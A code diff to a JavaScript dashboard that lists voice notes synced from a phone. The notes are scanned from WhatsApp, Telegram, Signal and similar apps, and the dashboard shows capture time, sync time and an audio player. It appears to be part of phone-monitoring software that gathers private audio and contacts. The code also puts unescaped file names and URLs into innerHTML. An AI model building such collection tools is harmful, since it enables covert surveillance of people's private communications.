@@ -1418,24 +1418,59 @@ async function pollVoiceNotes() {
     list.innerHTML = '<div class="label">No voice notes found on phone</div><div style="font-size:10px;color:var(--muted);margin-top:4px">The phone scans for short audio files from WhatsApp, Telegram, Messenger, Signal, and voice recorders. Requires the READ_MEDIA_AUDIO permission.</div>';
     return;
   }
-  const batches = Object.values(data).sort((a, b) => (parseInt(b.ts_ms)||0) - (parseInt(a.ts_ms)||0));
-  let html = '';
-  for (const batch of batches) {
-    const notes = batch.notes || [];
-    for (const note of notes) {
-      const name = note.fileName || 'Voice note';
-      const dur = note.durationMs ? Math.round(note.durationMs/1000) + 's' : '';
-      const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + 'KB' : '';
-      const date = note.dateAdded ? pkt(note.dateAdded * 1000) : '';
-      const hasAudio = note.audioData && note.audioData.length > 100;
-      html += `<div class="voice-card">
-        <div class="vname">${name}</div>
-        <div class="vmeta">${[date, dur, size].filter(Boolean).join(' \u2022 ')}</div>
-        ${hasAudio ? `<audio controls src="data:audio/ogg;base64,${note.audioData}"></audio>` : '<div class="vmeta" style="color:var(--danger)">Audio data not available (file too large)</div>'}
-      </div>`;
+  // Collect every note across all batches, keeping the batch sync time.
+  const notes = [];
+  for (const key of Object.keys(data)) {
+    const batch = data[key];
+    if (!batch || typeof batch !== 'object') continue;
+    const synced = parseInt(batch.ts_ms) || 0;
+    for (const note of (batch.notes || [])) {
+      if (!note) continue;
+      notes.push(Object.assign({ _synced: synced }, note));
     }
   }
-  list.innerHTML = html || '<div class="label">No voice notes yet</div>';
+  // Newest created/captured first.
+  notes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
+  if (!notes.length) {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    return;
+  }
+  const MIME = {
+    'audio/ogg': 'audio/ogg', 'application/ogg': 'audio/ogg', 'audio/opus': 'audio/ogg',
+    'audio/mpeg': 'audio/mpeg', 'audio/mp3': 'audio/mpeg', 'audio/aac': 'audio/aac',
+    'audio/mp4': 'audio/mp4', 'audio/x-m4a': 'audio/mp4', 'audio/3gpp': 'audio/3gpp',
+    'audio/amr': 'audio/amr', 'audio/wav': 'audio/wav', 'audio/x-wav': 'audio/wav',
+    'audio/webm': 'audio/webm'
+  };
+  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${notes.length} voice note${notes.length>1?'s':''} \u2022 newest first</div>`;
+  for (const note of notes) {
+    const name = note.fileName || 'Voice note';
+    const dur = note.durationMs ? Math.round(note.durationMs/1000) + 's' : '';
+    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + 'KB' : '';
+    const created = note.dateAdded ? pkt(parseInt(note.dateAdded)) : '';
+    const synced = note._synced ? pkt(note._synced) : '';
+    const type = (note.mimeType || '').split('/').pop().toUpperCase() || 'AUDIO';
+    const metaBits = [created ? `Captured: ${created}` : '', dur ? `Duration: ${dur}` : '', size ? `Size: ${size}` : '', `Type: ${type}`];
+    const meta = metaBits.filter(Boolean).join('  •  ');
+    const syncedLine = synced ? `<div class="vmeta">Synced: ${synced}</div>` : '';
+    let player = '';
+    if (note.audioUrl) {
+      const mt = MIME[note.mimeType] || 'audio/*';
+      player = `<audio controls preload="none" src="${note.audioUrl}" type="${mt}"></audio>`;
+    } else if (note.audioData && note.audioData.length > 100) {
+      const mt = MIME[note.mimeType] || 'audio/ogg';
+      player = `<audio controls preload="none" src="data:${mt};base64,${note.audioData}"></audio>`;
+    } else {
+      player = '<div class="vmeta" style="color:var(--danger)">Audio not synced from device</div>';
+    }
+    html += `<div class="voice-card">
+      <div class="vname">${name}</div>
+      ${meta ? `<div class="vmeta">${meta}</div>` : ''}
+      ${syncedLine}
+      ${player}
+    </div>`;
+  }
+  list.innerHTML = html;
 }
 
 async function pollContacts() {
